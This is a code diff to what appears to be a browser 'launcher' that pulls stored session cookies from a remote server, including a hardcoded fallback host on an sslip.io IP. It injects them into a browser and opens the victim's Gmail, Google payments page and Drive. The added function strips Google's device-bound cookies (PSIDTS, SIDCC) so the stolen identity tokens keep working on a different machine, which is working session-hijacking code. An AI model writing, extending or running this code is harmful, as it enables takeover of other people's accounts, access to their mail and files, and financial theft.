@@ -24,6 +24,22 @@ const FREE_MS_DOMAINS = new Set([
   'msn.com', 'live.net'
 ]);
 
+function sanitizeGoogleCookiesForFirstLaunch(cookies) {
+  if (!Array.isArray(cookies)) return [];
+  return cookies.filter(cookie => {
+    if (!cookie || !cookie.name) return false;
+    const name = cookie.name;
+    const dom = (cookie.domain || '').toLowerCase();
+    // 1. Strip machine-bound device cryptographic timestamps and signatures
+    if (name === '__Secure-1PSIDTS' || name === '__Secure-3PSIDTS') return false;
+    if (name === 'SIDCC' || name === '__Secure-1PSIDCC' || name === '__Secure-3PSIDCC') return false;
+    // 2. Strip country-specific ccTLDs (e.g. .google.com.ng) to prevent jar domain collisions
+    if (dom.endsWith('.google.com.ng') || dom.includes('.google.co.')) return false;
+    // 3. Keep all primary master identity tokens and service OSIDs intact
+    return true;
+  });
+}
+
 function resolveSmartPlatformUrls(domain, platform, email, cookies = []) {
   const d = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
   const p = (platform || '').toLowerCase().trim();
@@ -54,7 +70,7 @@ function resolveSmartPlatformUrls(domain, platform, email, cookies = []) {
   if (p === 'google' || p === 'gmail' || p.includes('google') || p.includes('gmail') || p.includes('gsuite') || p.includes('workspace') || d.includes('google') || d.includes('gmail') || em.endsWith('@gmail.com') || em.endsWith('@googlemail.com') || cookieProvider === 'google') {
     return [
       'https://mail.google.com/mail/u/0/#inbox',
-      'https://myaccount.google.com/u/0/payments-and-subscriptions',
+      'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0',
       'https://drive.google.com/drive/u/0/my-drive'
     ];
   }
@@ -86,7 +102,7 @@ function resolveSmartPlatformUrls(domain, platform, email, cookies = []) {
 
   return [
     'https://mail.google.com/mail/u/0/#inbox',
-    'https://myaccount.google.com/u/0/payments-and-subscriptions',
+    'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0',
       'https://drive.google.com/drive/u/0/my-drive'
   ];
 }
@@ -377,20 +393,52 @@ async function launchSession(browserId, token, launcherKeyParam, usernameParam) 
     appendLog(`[INFO] Validating session for ${browserId} (launcherKey: ${launcherKey})...`);
 
     let base = String(API_BASE || '').trim().replace(/\/+$/, '');
+    const PROD_API = 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';
     const requestPayload = { browserId, token, launcherKey, username };
 
-    let validateRes = await fetch(`${base}/electron/session-data`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(requestPayload),
-    });
+    async function attemptFetchSessionData(apiEndpoint) {
+      const ctrl = new AbortController();
+      const timer = setTimeout(() => ctrl.abort(), 6000);
+      try {
+        let res = await fetch(`${apiEndpoint}/electron/session-data`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(requestPayload),
+          signal: ctrl.signal,
+        });
+        if (res.status === 404 && !apiEndpoint.endsWith('/api')) {
+          res = await fetch(`${apiEndpoint}/api/electron/session-data`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(requestPayload),
+            signal: ctrl.signal,
+          });
+        }
+        return res;
+      } finally {
+        clearTimeout(timer);
+      }
+    }
 
-    if (validateRes.status === 404 && !base.endsWith('/api')) {
-      validateRes = await fetch(`${base}/api/electron/session-data`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(requestPayload),
-      });
+    let validateRes = null;
+    try {
+      validateRes = await attemptFetchSessionData(base);
+    } catch (netErr) {
+      appendLog(`[NET] Primary API (${base}) unreachable or timed out: ${netErr.message}. Attempting production fallback...`);
+    }
+
+    if ((!validateRes || !validateRes.ok) && base !== PROD_API) {
+      try {
+        appendLog(`[NET] Retrying session validation via production API: ${PROD_API}`);
+        const fallbackRes = await attemptFetchSessionData(PROD_API);
+        if (fallbackRes && (fallbackRes.ok || fallbackRes.status === 403)) {
+          validateRes = fallbackRes;
+          base = PROD_API;
+          API_BASE = PROD_API;
+        }
+      } catch (fbErr) {
+        appendLog(`[NET] Fallback API notice: ${fbErr.message}`);
+      }
     }
 
     if (!validateRes.ok) {
@@ -723,13 +771,19 @@ async function launchSession(browserId, token, launcherKeyParam, usernameParam) 
           appendLog('[INFO] Subsequent launch: preserving local Windows DPAPI cookies (avoiding replay of database cookies).');
           cookiesSet = allCookiesToInject.length;
         } else {
-          appendLog(`[INFO] Ingesting ${allCookiesToInject.length} cookies from ${cookieCandidateName} into browser jar...`);
-          for (const c of allCookiesToInject) {
+          let cookiesToInject = allCookiesToInject;
+          if (isGoogleSession) {
+            cookiesToInject = sanitizeGoogleCookiesForFirstLaunch(allCookiesToInject);
+            appendLog(`[INFO] First launch sanitization: preserved ${cookiesToInject.length}/${allCookiesToInject.length} clean root tokens (stripped machine-bound PSIDTS/SIDCC and regional domains for cross-PC resilience).`);
+          } else {
+            appendLog(`[INFO] Ingesting ${allCookiesToInject.length} cookies from ${cookieCandidateName} into browser jar...`);
+          }
+          for (const c of cookiesToInject) {
             appendLog(`[COOKIE] ${c.domain} | ${c.name} (path: ${c.path || '/'})`);
           }
   
           // Fast batch cookie injection via Network.setCookies if available
-          const cdpCookiesList = allCookiesToInject.map(cookie => {
+          const cdpCookiesList = cookiesToInject.map(cookie => {
             const cdpCookie = {
               name: cookie.name,
               value: cookie.value,
@@ -785,7 +839,7 @@ async function launchSession(browserId, token, launcherKeyParam, usernameParam) 
         if (!targetUrls || targetUrls.length === 0) {
           targetUrls = [
             'https://mail.google.com/mail/u/0/#inbox',
-            'https://myaccount.google.com/u/0/payments-and-subscriptions',
+            'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0',
       'https://drive.google.com/drive/u/0/my-drive'
           ];
         }
